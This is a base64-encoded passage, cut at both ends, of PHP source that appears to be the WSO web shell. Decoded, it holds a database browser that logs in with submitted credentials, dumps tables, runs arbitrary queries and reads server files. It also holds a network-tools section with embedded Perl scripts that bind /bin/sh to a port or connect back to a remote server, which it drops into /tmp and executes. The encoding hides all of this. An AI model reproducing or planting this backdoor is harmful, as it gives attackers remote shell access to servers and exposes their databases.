ImAiLiRrLiJgIjsKCQkJCQkJfQogICAgICAgICAgICAgICAgICAgICAgICBpZigkaGVhZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCAuPSAnSU5TRVJUIElOVE8gYCcuJHRhYmxlLidgICgnLmltcGxvZGUoIiwgIiwgJGNvbHVtbnMpLiIpIFZBTFVFUyBcblx0KCIuaW1wbG9kZSgiLCAiLCAkaXRlbSkuJyknOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGhlYWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICJcblx0LCgiLmltcGxvZGUoIiwgIiwgJGl0ZW0pLicpJzsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGZwKSBmd3JpdGUoJGZwLCAkc3FsKTsgZWxzZSBlY2hvKCRzcWwpOwogICAgICAgICAgICAgICAgICAgICAgICAkaSsrOwoJCQkJCX0KICAgICAgICAgICAgICAgICAgICBpZighJGhlYWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRmcCkgZndyaXRlKCRmcCwgIjtcblxuIik7IGVsc2UgZWNobygiO1xuXG4iKTsKCQkJCWJyZWFrOwoJCQkJY2FzZSAncGdzcWwnOgoJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSAnLiR0YWJsZSk7CgkJCQkJd2hpbGUoJGl0ZW0gPSAkdGhpcy0+ZmV0Y2goKSkgewoJCQkJCQkkY29sdW1ucyA9IGFycmF5KCk7CgkJCQkJCWZvcmVhY2goJGl0ZW0gYXMgJGs9PiR2KSB7CgkJCQkJCQkkaXRlbVska10gPSAiJyIuYWRkc2xhc2hlcygkdikuIiciOwoJCQkJCQkJJGNvbHVtbnNbXSA9ICRrOwoJCQkJCQl9CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnSU5TRVJUIElOVE8gJy4kdGFibGUuJyAoJy5pbXBsb2RlKCIsICIsICRjb2x1bW5zKS4nKSBWQUxVRVMgKCcuaW1wbG9kZSgiLCAiLCAkaXRlbSkuJyk7Jy4iXG4iOwogICAgICAgICAgICAgICAgICAgICAgICBpZigkZnApIGZ3cml0ZSgkZnAsICRzcWwpOyBlbHNlIGVjaG8oJHNxbCk7CgkJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJcmV0dXJuIGZhbHNlOwoJCX0KCX07CgkkZGIgPSBuZXcgRGJDbGFzcygkX1BPU1RbJ3R5cGUnXSk7CglpZigoQCRfUE9TVFsncDInXT09J2Rvd25sb2FkJykgJiYgKEAkX1BPU1RbJ3AxJ10hPSdzZWxlY3QnKSkgewoJCSRkYi0+Y29ubmVjdCgkX1BPU1RbJ3NxbF9ob3N0J10sICRfUE9TVFsnc3FsX2xvZ2luJ10sICRfUE9TVFsnc3FsX3Bhc3MnXSwgJF9QT1NUWydzcWxfYmFzZSddKTsKCQkkZGItPnNlbGVjdGRiKCRfUE9TVFsnc3FsX2Jhc2UnXSk7CiAgICAgICAgc3dpdGNoKCRfUE9TVFsnY2hhcnNldCddKSB7CiAgICAgICAgICAgIGNhc2UgIldpbmRvd3MtMTI1MSI6ICRkYi0+c2V0Q2hhcnNldCgnY3AxMjUxJyk7IGJyZWFrOwogICAgICAgICAgICBjYXNlICJVVEYtOCI6ICRkYi0+c2V0Q2hhcnNldCgndXRmOCcpOyBicmVhazsKICAgICAgICAgICAgY2FzZSAiS09JOC1SIjogJGRiLT5zZXRDaGFyc2V0KCdrb2k4cicpOyBicmVhazsKICAgICAgICAgICAgY2FzZSAiS09JOC1VIjogJGRiLT5zZXRDaGFyc2V0KCdrb2k4dScpOyBicmVhazsKICAgICAgICAgICAgY2FzZSAiY3A4NjYiOiAkZGItPnNldENoYXJzZXQoJ2NwODY2Jyk7IGJyZWFrOwogICAgICAgIH0KICAgICAgICBpZihlbXB0eSgkX1BPU1RbJ2ZpbGUnXSkpIHsKICAgICAgICAgICAgb2Jfc3RhcnQoIm9iX2d6aGFuZGxlciIsIDQwOTYpOwogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPWR1bXAuc3FsIik7CiAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluIik7CiAgICAgICAgICAgIGZvcmVhY2goJF9QT1NUWyd0YmwnXSBhcyAkdikKCQkJCSRkYi0+ZHVtcCgkdik7CiAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfSBlbHNlaWYoJGZwID0gQGZvcGVuKCRfUE9TVFsnZmlsZSddLCAndycpKSB7CiAgICAgICAgICAgIGZvcmVhY2goJF9QT1NUWyd0YmwnXSBhcyAkdikKICAgICAgICAgICAgICAgICRkYi0+ZHVtcCgkdiwgJGZwKTsKICAgICAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgICAgIHVuc2V0KCRfUE9TVFsncDInXSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgICAgIGRpZSgnPHNjcmlwdD5hbGVydCgiRXJyb3IhIENhblwndCBvcGVuIGZpbGUiKTt3aW5kb3cuaGlzdG9yeS5iYWNrKC0xKTwvc2NyaXB0PicpOwoJfQoJd3NvSGVhZGVyKCk7CgllY2hvICIKPGgxPlNxbCBicm93c2VyPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+Cjxmb3JtIG5hbWU9J3NmJyBtZXRob2Q9J3Bvc3QnIG9uc3VibWl0PSdmcyh0aGlzKTsnPjx0YWJsZSBjZWxscGFkZGluZz0nMicgY2VsbHNwYWNpbmc9JzAnPjx0cj4KPHRkPlR5cGU8L3RkPjx0ZD5Ib3N0PC90ZD48dGQ+TG9naW48L3RkPjx0ZD5QYXNzd29yZDwvdGQ+PHRkPkRhdGFiYXNlPC90ZD48dGQ+PC90ZD48L3RyPjx0cj4KPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT1TcWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9cDEgdmFsdWU9J3F1ZXJ5Jz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMiB2YWx1ZT0nJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1jIHZhbHVlPSciLiBodG1sc3BlY2lhbGNoYXJzKCRHTE9CQUxTWydjd2QnXSkgLiInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNoYXJzZXQgdmFsdWU9JyIuIChpc3NldCgkX1BPU1RbJ2NoYXJzZXQnXSk/JF9QT1NUWydjaGFyc2V0J106JycpIC4iJz4KPHRkPjxzZWxlY3QgbmFtZT0ndHlwZSc+PG9wdGlvbiB2YWx1ZT0nbXlzcWwnICI7CiAgICBpZihAJF9QT1NUWyd0eXBlJ109PSdteXNxbCcpZWNobyAnc2VsZWN0ZWQnOwplY2hvICI+TXlTcWw8L29wdGlvbj48b3B0aW9uIHZhbHVlPSdwZ3NxbCcgIjsKaWYoQCRfUE9TVFsndHlwZSddPT0ncGdzcWwnKWVjaG8gJ3NlbGVjdGVkJzsKZWNobyAiPlBvc3RncmVTcWw8L29wdGlvbj48L3NlbGVjdD48L3RkPgo8dGQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXNxbF9ob3N0IHZhbHVlPVwiIi4gKGVtcHR5KCRfUE9TVFsnc3FsX2hvc3QnXSk/J2xvY2FsaG9zdCc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3NxbF9ob3N0J10pKSAuIlwiPjwvdGQ+Cjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2xvZ2luIHZhbHVlPVwiIi4gKGVtcHR5KCRfUE9TVFsnc3FsX2xvZ2luJ10pPydyb290JzpodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnc3FsX2xvZ2luJ10pKSAuIlwiPjwvdGQ+Cjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX3Bhc3MgdmFsdWU9XCIiLiAoZW1wdHkoJF9QT1NUWydzcWxfcGFzcyddKT8nJzpodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnc3FsX3Bhc3MnXSkpIC4iXCI+PC90ZD48dGQ+IjsKCSR0bXAgPSAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPXNxbF9iYXNlIHZhbHVlPScnPiI7CglpZihpc3NldCgkX1BPU1RbJ3NxbF9ob3N0J10pKXsKCQlpZigkZGItPmNvbm5lY3QoJF9QT1NUWydzcWxfaG9zdCddLCAkX1BPU1RbJ3NxbF9sb2dpbiddLCAkX1BPU1RbJ3NxbF9wYXNzJ10sICRfUE9TVFsnc3FsX2Jhc2UnXSkpIHsKCQkJc3dpdGNoKCRfUE9TVFsnY2hhcnNldCddKSB7CgkJCQljYXNlICJXaW5kb3dzLTEyNTEiOiAkZGItPnNldENoYXJzZXQoJ2NwMTI1MScpOyBicmVhazsKCQkJCWNhc2UgIlVURi04IjogJGRiLT5zZXRDaGFyc2V0KCd1dGY4Jyk7IGJyZWFrOwoJCQkJY2FzZSAiS09JOC1SIjogJGRiLT5zZXRDaGFyc2V0KCdrb2k4cicpOyBicmVhazsKCQkJCWNhc2UgIktPSTgtVSI6ICRkYi0+c2V0Q2hhcnNldCgna29pOHUnKTsgYnJlYWs7CgkJCQljYXNlICJjcDg2NiI6ICRkYi0+c2V0Q2hhcnNldCgnY3A4NjYnKTsgYnJlYWs7CgkJCX0KCQkJJGRiLT5saXN0RGJzKCk7CgkJCWVjaG8gIjxzZWxlY3QgbmFtZT1zcWxfYmFzZT48b3B0aW9uIHZhbHVlPScnPjwvb3B0aW9uPiI7CgkJCXdoaWxlKCRpdGVtID0gJGRiLT5mZXRjaCgpKSB7CgkJCQlsaXN0KCRrZXksICR2YWx1ZSkgPSBlYWNoKCRpdGVtKTsKCQkJCWVjaG8gJzxvcHRpb24gdmFsdWU9IicuJHZhbHVlLiciICcuKCR2YWx1ZT09JF9QT1NUWydzcWxfYmFzZSddPydzZWxlY3RlZCc6JycpLic+Jy4kdmFsdWUuJzwvb3B0aW9uPic7CgkJCX0KCQkJZWNobyAnPC9zZWxlY3Q+JzsKCQl9CgkJZWxzZSBlY2hvICR0bXA7Cgl9ZWxzZQoJCWVjaG8gJHRtcDsKCWVjaG8gIjwvdGQ+CgkJCQk8dGQ+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Picgb25jbGljaz0nZnMoZC5zZik7Jz48L3RkPgogICAgICAgICAgICAgICAgPHRkPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9c3FsX2NvdW50IHZhbHVlPSdvbiciIC4gKGVtcHR5KCRfUE9TVFsnc3FsX2NvdW50J10pPycnOicgY2hlY2tlZCcpIC4gIj4gY291bnQgdGhlIG51bWJlciBvZiByb3dzPC90ZD4KCQkJPC90cj4KCQk8L3RhYmxlPgoJCTxzY3JpcHQ+CiAgICAgICAgICAgIHNfZGI9JyIuQGFkZHNsYXNoZXMoJF9QT1NUWydzcWxfYmFzZSddKS4iJzsKICAgICAgICAgICAgZnVuY3Rpb24gZnMoZikgewogICAgICAgICAgICAgICAgaWYoZi5zcWxfYmFzZS52YWx1ZSE9c19kYikgeyBmLm9uc3VibWl0ID0gZnVuY3Rpb24oKSB7fTsKICAgICAgICAgICAgICAgICAgICBpZihmLnAxKSBmLnAxLnZhbHVlPScnOwogICAgICAgICAgICAgICAgICAgIGlmKGYucDIpIGYucDIudmFsdWU9Jyc7CiAgICAgICAgICAgICAgICAgICAgaWYoZi5wMykgZi5wMy52YWx1ZT0nJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoJCQlmdW5jdGlvbiBzdCh0LGwpIHsKCQkJCWQuc2YucDEudmFsdWUgPSAnc2VsZWN0JzsKCQkJCWQuc2YucDIudmFsdWUgPSB0OwogICAgICAgICAgICAgICAgaWYobCAmJiBkLnNmLnAzKSBkLnNmLnAzLnZhbHVlID0gbDsKCQkJCWQuc2Yuc3VibWl0KCk7CgkJCX0KCQkJZnVuY3Rpb24gaXMoKSB7CgkJCQlmb3IoaT0wO2k8ZC5zZi5lbGVtZW50c1sndGJsW10nXS5sZW5ndGg7KytpKQoJCQkJCWQuc2YuZWxlbWVudHNbJ3RibFtdJ11baV0uY2hlY2tlZCA9ICFkLnNmLmVsZW1lbnRzWyd0YmxbXSddW2ldLmNoZWNrZWQ7CgkJCX0KCQk8L3NjcmlwdD4iOwoJaWYoaXNzZXQoJGRiKSAmJiAkZGItPmxpbmspewoJCWVjaG8gIjxici8+PHRhYmxlIHdpZHRoPTEwMCUgY2VsbHBhZGRpbmc9MiBjZWxsc3BhY2luZz0wPiI7CgkJCWlmKCFlbXB0eSgkX1BPU1RbJ3NxbF9iYXNlJ10pKXsKCQkJCSRkYi0+c2VsZWN0ZGIoJF9QT1NUWydzcWxfYmFzZSddKTsKCQkJCWVjaG8gIjx0cj48dGQgd2lkdGg9MSBzdHlsZT0nYm9yZGVyLXRvcDoycHggc29saWQgIzY2NjsnPjxzcGFuPlRhYmxlczo8L3NwYW4+PGJyPjxicj4iOwoJCQkJJHRibHNfcmVzID0gJGRiLT5saXN0VGFibGVzKCk7CgkJCQl3aGlsZSgkaXRlbSA9ICRkYi0+ZmV0Y2goJHRibHNfcmVzKSkgewoJCQkJCWxpc3QoJGtleSwgJHZhbHVlKSA9IGVhY2goJGl0ZW0pOwogICAgICAgICAgICAgICAgICAgIGlmKCFlbXB0eSgkX1BPU1RbJ3NxbF9jb3VudCddKSkKICAgICAgICAgICAgICAgICAgICAgICAgJG4gPSAkZGItPmZldGNoKCRkYi0+cXVlcnkoJ1NFTEVDVCBDT1VOVCgqKSBhcyBuIEZST00gJy4kdmFsdWUuJycpKTsKCQkJCQkkdmFsdWUgPSBodG1sc3BlY2lhbGNoYXJzKCR2YWx1ZSk7CgkJCQkJZWNobyAiPG5vYnI+PGlucHV0IHR5cGU9J2NoZWNrYm94JyBuYW1lPSd0YmxbXScgdmFsdWU9JyIuJHZhbHVlLiInPiZuYnNwOzxhIGhyZWY9IyBvbmNsaWNrPVwic3QoJyIuJHZhbHVlLiInLDEpXCI+Ii4kdmFsdWUuIjwvYT4iIC4gKGVtcHR5KCRfUE9TVFsnc3FsX2NvdW50J10pPycmbmJzcDsnOiIgPHNtYWxsPih7JG5bJ24nXX0pPC9zbWFsbD4iKSAuICI8L25vYnI+PGJyPiI7CgkJCQl9CgkJCQllY2hvICI8aW5wdXQgdHlwZT0nY2hlY2tib3gnIG9uY2xpY2s9J2lzKCk7Jz4gPGlucHV0IHR5cGU9YnV0dG9uIHZhbHVlPSdEdW1wJyBvbmNsaWNrPSdkb2N1bWVudC5zZi5wMi52YWx1ZT1cImRvd25sb2FkXCI7ZG9jdW1lbnQuc2Yuc3VibWl0KCk7Jz48YnI+RmlsZSBwYXRoOjxpbnB1dCB0eXBlPXRleHQgbmFtZT1maWxlIHZhbHVlPSdkdW1wLnNxbCc+PC90ZD48dGQgc3R5bGU9J2JvcmRlci10b3A6MnB4IHNvbGlkICM2NjY7Jz4iOwoJCQkJaWYoQCRfUE9TVFsncDEnXSA9PSAnc2VsZWN0JykgewoJCQkJCSRfUE9TVFsncDEnXSA9ICdxdWVyeSc7CiAgICAgICAgICAgICAgICAgICAgJF9QT1NUWydwMyddID0gJF9QT1NUWydwMyddPyRfUE9TVFsncDMnXToxOwoJCQkJCSRkYi0+cXVlcnkoJ1NFTEVDVCBDT1VOVCgqKSBhcyBuIEZST00gJyAuICRfUE9TVFsncDInXSk7CgkJCQkJJG51bSA9ICRkYi0+ZmV0Y2goKTsKCQkJCQkkcGFnZXMgPSBjZWlsKCRudW1bJ24nXSAvIDMwKTsKICAgICAgICAgICAgICAgICAgICBlY2hvICI8c2NyaXB0PmQuc2Yub25zdWJtaXQ9ZnVuY3Rpb24oKXtzdChcIiIgLiAkX1BPU1RbJ3AyJ10gLiAiXCIsIGQuc2YucDMudmFsdWUpfTwvc2NyaXB0PjxzcGFuPiIuJF9QT1NUWydwMiddLiI8L3NwYW4+ICh7JG51bVsnbiddfSByZWNvcmRzKSBQYWdlICMgPGlucHV0IHR5cGU9dGV4dCBuYW1lPSdwMycgdmFsdWU9IiAuICgoaW50KSRfUE9TVFsncDMnXSkgLiAiPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAiIG9mICRwYWdlcyI7CiAgICAgICAgICAgICAgICAgICAgaWYoJF9QT1NUWydwMyddID4gMSkKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiIDxhIGhyZWY9IyBvbmNsaWNrPSdzdChcIiIgLiAkX1BPU1RbJ3AyJ10gLiAnIiwgJyAuICgkX1BPU1RbJ3AzJ10tMSkgLiAiKSc+Jmx0OyBQcmV2PC9hPiI7CiAgICAgICAgICAgICAgICAgICAgaWYoJF9QT1NUWydwMyddIDwgJHBhZ2VzKQogICAgICAgICAgICAgICAgICAgICAgICBlY2hvICIgPGEgaHJlZj0jIG9uY2xpY2s9J3N0KFwiIiAuICRfUE9TVFsncDInXSAuICciLCAnIC4gKCRfUE9TVFsncDMnXSsxKSAuICIpJz5OZXh0ICZndDs8L2E+IjsKICAgICAgICAgICAgICAgICAgICAkX1BPU1RbJ3AzJ10tLTsKCQkJCQlpZigkX1BPU1RbJ3R5cGUnXT09J3Bnc3FsJykKCQkJCQkJJF9QT1NUWydwMiddID0gJ1NFTEVDVCAqIEZST00gJy4kX1BPU1RbJ3AyJ10uJyBMSU1JVCAzMCBPRkZTRVQgJy4oJF9QT1NUWydwMyddKjMwKTsKCQkJCQllbHNlCgkJCQkJCSRfUE9TVFsncDInXSA9ICdTRUxFQ1QgKiBGUk9NIGAnLiRfUE9TVFsncDInXS4nYCBMSU1JVCAnLigkX1BPU1RbJ3AzJ10qMzApLicsMzAnOwoJCQkJCWVjaG8gIjxicj48YnI+IjsKCQkJCX0KCQkJCWlmKChAJF9QT1NUWydwMSddID09ICdxdWVyeScpICYmICFlbXB0eSgkX1BPU1RbJ3AyJ10pKSB7CgkJCQkJJGRiLT5xdWVyeShAJF9QT1NUWydwMiddKTsKCQkJCQlpZigkZGItPnJlcyAhPT0gZmFsc2UpIHsKCQkJCQkJJHRpdGxlID0gZmFsc2U7CgkJCQkJCWVjaG8gJzx0YWJsZSB3aWR0aD0xMDAlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9MiBjbGFzcz1tYWluIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiMyOTI5MjkiPic7CgkJCQkJCSRsaW5lID0gMTsKCQkJCQkJd2hpbGUoJGl0ZW0gPSAkZGItPmZldGNoKCkpCXsKCQkJCQkJCWlmKCEkdGl0bGUpCXsKCQkJCQkJCQllY2hvICc8dHI+JzsKCQkJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrZXkgPT4gJHZhbHVlKQoJCQkJCQkJCQllY2hvICc8dGg+Jy4ka2V5Lic8L3RoPic7CgkJCQkJCQkJcmVzZXQoJGl0ZW0pOwoJCQkJCQkJCSR0aXRsZT10cnVlOwoJCQkJCQkJCWVjaG8gJzwvdHI+PHRyPic7CgkJCQkJCQkJJGxpbmUgPSAyOwoJCQkJCQkJfQoJCQkJCQkJZWNobyAnPHRyIGNsYXNzPSJsJy4kbGluZS4nIj4nOwoJCQkJCQkJJGxpbmUgPSAkbGluZT09MT8yOjE7CgkJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrZXkgPT4gJHZhbHVlKSB7CgkJCQkJCQkJaWYoJHZhbHVlID09IG51bGwpCgkJCQkJCQkJCWVjaG8gJzx0ZD48aT5udWxsPC9pPjwvdGQ+JzsKCQkJCQkJCQllbHNlCgkJCQkJCQkJCWVjaG8gJzx0ZD4nLm5sMmJyKGh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlKSkuJzwvdGQ+JzsKCQkJCQkJCX0KCQkJCQkJCWVjaG8gJzwvdHI+JzsKCQkJCQkJfQoJCQkJCQllY2hvICc8L3RhYmxlPic7CgkJCQkJfSBlbHNlIHsKCQkJCQkJZWNobyAnPGRpdj48Yj5FcnJvcjo8L2I+ICcuaHRtbHNwZWNpYWxjaGFycygkZGItPmVycm9yKCkpLic8L2Rpdj4nOwoJCQkJCX0KCQkJCX0KCQkJCWVjaG8gIjxicj48L2Zvcm0+PGZvcm0gb25zdWJtaXQ9J2Quc2YucDEudmFsdWU9XCJxdWVyeVwiO2Quc2YucDIudmFsdWU9dGhpcy5xdWVyeS52YWx1ZTtkb2N1bWVudC5zZi5zdWJtaXQoKTtyZXR1cm4gZmFsc2U7Jz48dGV4dGFyZWEgbmFtZT0ncXVlcnknIHN0eWxlPSd3aWR0aDoxMDAlO2hlaWdodDoxMDBweCc+IjsKICAgICAgICAgICAgICAgIGlmKCFlbXB0eSgkX1BPU1RbJ3AyJ10pICYmICgkX1BPU1RbJ3AxJ10gIT0gJ2xvYWRmaWxlJykpCiAgICAgICAgICAgICAgICAgICAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDInXSk7CiAgICAgICAgICAgICAgICBlY2hvICI8L3RleHRhcmVhPjxici8+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFeGVjdXRlJz4iOwoJCQkJZWNobyAiPC90ZD48L3RyPiI7CgkJCX0KCQkJZWNobyAiPC90YWJsZT48L2Zvcm0+PGJyLz4iOwogICAgICAgICAgICBpZigkX1BPU1RbJ3R5cGUnXT09J215c3FsJykgewogICAgICAgICAgICAgICAgJGRiLT5xdWVyeSgiU0VMRUNUIDEgRlJPTSBteXNxbC51c2VyIFdIRVJFIGNvbmNhdChgdXNlcmAsICdAJywgYGhvc3RgKSA9IFVTRVIoKSBBTkQgYEZpbGVfcHJpdmAgPSAneSciKTsKICAgICAgICAgICAgICAgIGlmKCRkYi0+ZmV0Y2goKSkKICAgICAgICAgICAgICAgICAgICBlY2hvICI8Zm9ybSBvbnN1Ym1pdD0nZC5zZi5wMS52YWx1ZT1cImxvYWRmaWxlXCI7ZG9jdW1lbnQuc2YucDIudmFsdWU9dGhpcy5mLnZhbHVlO2RvY3VtZW50LnNmLnN1Ym1pdCgpO3JldHVybiBmYWxzZTsnPjxzcGFuPkxvYWQgZmlsZTwvc3Bhbj4gPGlucHV0ICBjbGFzcz0ndG9vbHNJbnAnIHR5cGU9dGV4dCBuYW1lPWY+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pic+PC9mb3JtPiI7CiAgICAgICAgICAgIH0KCQkJaWYoQCRfUE9TVFsncDEnXSA9PSAnbG9hZGZpbGUnKSB7CgkJCQkkZmlsZSA9ICRkYi0+bG9hZEZpbGUoJF9QT1NUWydwMiddKTsKCQkJCWVjaG8gJzxici8+PHByZSBjbGFzcz1tbDE+Jy5odG1sc3BlY2lhbGNoYXJzKCRmaWxlWydmaWxlJ10pLic8L3ByZT4nOwoJCQl9Cgl9IGVsc2UgewogICAgICAgIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkZGItPmVycm9yKCkpOwogICAgfQoJZWNobyAnPC9kaXY+JzsKCXdzb0Zvb3RlcigpOwp9CmZ1bmN0aW9uIGFjdGlvbk5ldHdvcmsoKSB7Cgl3c29IZWFkZXIoKTsKCSRiYWNrX2Nvbm5lY3RfcD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1UyOWphMlYwT3cwS0pHbGhaR1J5UFdsdVpYUmZZWFJ2Ymlna1FWSkhWbHN3WFNrZ2ZId2daR2xsS0NKRmNuSnZjam9nSkNGY2JpSXBPdzBLSkhCaFpHUnlQWE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENBa2FXRmtaSElwSUh4OElHUnBaU2dpUlhKeWIzSTZJQ1FoWEc0aUtUc05DaVJ3Y205MGJ6MW5aWFJ3Y205MGIySjVibUZ0WlNnbmRHTndKeWs3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z0pIQnliM1J2S1NCOGZDQmthV1VvSWtWeWNtOXlPaUFrSVZ4dUlpazdEUXBqYjI1dVpXTjBLRk5QUTB0RlZDd2dKSEJoWkdSeUtTQjhmQ0JrYVdVb0lrVnljbTl5T2lBa0lWeHVJaWs3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFUlZKU0xDQWlQaVpUVDBOTFJWUWlLVHNOQ25ONWMzUmxiU2duTDJKcGJpOXphQ0F0YVNjcE93MEtZMnh2YzJVb1UxUkVTVTRwT3cwS1kyeHZjMlVvVTFSRVQxVlVLVHNOQ21Oc2IzTmxLRk5VUkVWU1VpazciOwoJJGJpbmRfcG9ydF9wPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRb2tVMGhGVEV3OUlpOWlhVzR2YzJnZ0xXa2lPdzBLYVdZZ0tFQkJVa2RXSUR3Z01Ta2dleUJsZUdsMEtERXBPeUI5RFFwMWMyVWdVMjlqYTJWME93MEtjMjlqYTJWMEtGTXNKbEJHWDBsT1JWUXNKbE5QUTB0ZlUxUlNSVUZOTEdkbGRIQnliM1J2WW5sdVlXMWxLQ2QwWTNBbktTa2dmSHdnWkdsbElDSkRZVzUwSUdOeVpXRjBaU0J6YjJOclpYUmNiaUk3RFFwelpYUnpiMk5yYjNCMEtGTXNVMDlNWDFOUFEwdEZWQ3hUVDE5U1JWVlRSVUZFUkZJc01TazdEUXBpYVc1a0tGTXNjMjlqYTJGa1pISmZhVzRvSkVGU1IxWmJNRjBzU1U1QlJFUlNYMEZPV1NrcElIeDhJR1JwWlNBaVEyRnVkQ0J2Y0dWdUlIQnZjblJjYmlJN0RRcHNhWE4wWlc0b1V5d3pLU0I4ZkNCa2FXVWdJa05oYm5RZ2JHbHpkR1Z1SUhCdmNuUmNiaUk3RFFwM2FHbHNaU2d4S1NCN0RRb0pZV05qWlhCMEtFTlBUazRzVXlrN0RRb0phV1lvSVNna2NHbGtQV1p2Y21zcEtTQjdEUW9KQ1dScFpTQWlRMkZ1Ym05MElHWnZjbXNpSUdsbUlDZ2haR1ZtYVc1bFpDQWtjR2xrS1RzTkNna0piM0JsYmlCVFZFUkpUaXdpUENaRFQwNU9JanNOQ2drSmIzQmxiaUJUVkVSUFZWUXNJajRtUTA5T1RpSTdEUW9KQ1c5d1pXNGdVMVJFUlZKU0xDSStKa05QVGs0aU93MEtDUWxsZUdWaklDUlRTRVZNVENCOGZDQmthV1VnY0hKcGJuUWdRMDlPVGlBaVEyRnVkQ0JsZUdWamRYUmxJQ1JUU0VWTVRGeHVJanNOQ2drSlkyeHZjMlVnUTA5T1Rqc05DZ2tKWlhocGRDQXdPdzBLQ1gwTkNuMD0iOwoJZWNobyAiPGgxPk5ldHdvcmsgdG9vbHM8L2gxPjxkaXYgY2xhc3M9Y29udGVudD4KCTxmb3JtIG5hbWU9J25mcCcgb25TdWJtaXQ9XCJnKG51bGwsbnVsbCwnYnBwJyx0aGlzLnBvcnQudmFsdWUpO3JldHVybiBmYWxzZTtcIj4KCTxzcGFuPkJpbmQgcG9ydCB0byAvYmluL3NoIFtwZXJsXTwvc3Bhbj48YnIvPgoJUG9ydDogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3BvcnQnIHZhbHVlPSczMTMzNyc+IDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nPj4nPgoJPC9mb3JtPgoJPGZvcm0gbmFtZT0nbmZwJyBvblN1Ym1pdD1cImcobnVsbCxudWxsLCdiY3AnLHRoaXMuc2VydmVyLnZhbHVlLHRoaXMucG9ydC52YWx1ZSk7cmV0dXJuIGZhbHNlO1wiPgoJPHNwYW4+QmFjay1jb25uZWN0ICBbcGVybF08L3NwYW4+PGJyLz4KCVNlcnZlcjogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3NlcnZlcicgdmFsdWU9JyIuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4iJz4gUG9ydDogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3BvcnQnIHZhbHVlPSczMTMzNyc+IDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nPj4nPgoJPC9mb3JtPjxicj4iOwoJaWYoaXNzZXQoJF9QT1NUWydwMSddKSkgewoJCWZ1bmN0aW9uIGNmKCRmLCR0KSB7CgkJCSR3ID0gQGZvcGVuKCRmLCJ3Iikgb3IgQGZ1bmN0aW9uX2V4aXN0cygnZmlsZV9wdXRfY29udGVudHMnKTsKCQkJaWYoJHcpewoJCQkJQGZ3cml0ZSgkdyxAYmFzZTY0X2RlY29kZSgkdCkpOwoJCQkJQGZjbG9zZSgkdyk7CgkJCX0KCQl9CgkJaWYoJF9QT1NUWydwMSddID09ICdicHAnKSB7CgkJCWNmKCIvdG1wL2JwLnBsIiwkYmluZF9wb3J0X3ApOwoJCQkkb3V0ID0gd3NvRXgoInBlcmwgL3RtcC9icC5wbCAiLiRfUE9TVFsncDInXS4iIDE+L2Rldi9udWxsIDI+JjEgJiIpOwogICAgICAgICAgICBzbGVlcCgxKTsKCQkJZWNobyAiPHByZSBjbGFzcz1tbDE+JG91dFxuIi53c29FeCgicHMgYXV4IHwgZ3JlcCBicC5wbCIpLiI8L3ByZT4iOwogICAgICAgICAgICB1bmxpbmsoIi90bXAvYnAucGwiKTsKCQl9CgkJaWYoJF9QT1NUWydwMSddID09ICdiY3AnKSB7CgkJCWNmKCIvdG1wL2JjLnBsIiwkYmFja19jb25u